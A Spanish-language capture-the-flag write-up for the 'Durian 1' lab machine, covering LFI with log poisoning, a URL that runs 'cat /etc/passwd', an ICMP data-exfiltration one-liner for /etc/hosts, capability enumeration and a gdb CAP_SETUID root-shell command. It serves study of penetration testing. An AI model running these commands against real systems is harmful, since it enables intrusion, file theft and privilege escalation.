# Durian 1

Tags: [[_lfi]],[[_webExploitation]],[[_capabilities]]

Continuamos... <span style="color:#ff669c">. _.</span>

Una vez cambiado el user-agent para colocar el parámetro cmd con el que voy a elegir el comando a ejecutar, podemos usarlo desde la web.
Teniendo en cuenta que gracias a los logs vistos en
/proc/self/fd/0 :    encontramos que 8 era el file descriptor que contiene los logs. Y al cambiar el user-agent, generamos un log poisoning.

Desde la web:
http://192.168.0.12/cgi-data/getImage.php?file=/proc/self/fd/8&cmd=cat/etc/passwd
Pues se ejecuta gracias a que se interpreta en los log.

Entonces ganamos acceso a la máquina.

ESCALADA.
No pertenezco a un grupo especial.
Sudo -l da cosas no importantes, aunque el de ping llama la atención

No es el caso, pero recordemos que podemos exfiltrar data a través de ICMP.
<span style="color:#88c425">xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 127.0.0.1 -p $line; done</span> 
Mandamos líneas de 4 a mi mismo, y vemos cómo sí se puede enviar patroness, en este caso del /etc/hosts

Podemos ver en gtfobins si hay posibilidad de escalar con ping o shutdown pero nada de nada.


<span style="color:#88c425">find / -perm -4000 -user root 2/dev/null</span> :    no hay mucho.
<span style="color:#88c425">getcap -r / 2>/dev/null</span> :    vemos gdb Uyy
Nos permite cambiar el UID.
<span style="color:#88c425">/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit</span> :    esto porque gdb tiene capabilitie CAP_SETUID

Ejecutamos y chinpun.